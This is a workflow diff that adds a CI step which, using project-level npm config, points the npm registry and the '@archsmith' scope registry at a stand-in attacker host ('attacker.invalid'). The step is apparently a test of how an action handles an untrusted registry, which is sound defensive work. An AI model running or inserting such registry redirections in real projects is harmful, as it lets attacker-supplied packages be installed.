@@ -37,6 +37,10 @@ jobs:
       - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
         with:
           node-version: ${{ matrix.node }}
+      - name: Configure untrusted repository registry
+        run: |
+          npm config set registry https://attacker.invalid/ --location=project
+          npm config set "@archsmith:registry" "https://attacker.invalid/" --location=project
       - id: setup
         uses: ./
         with:
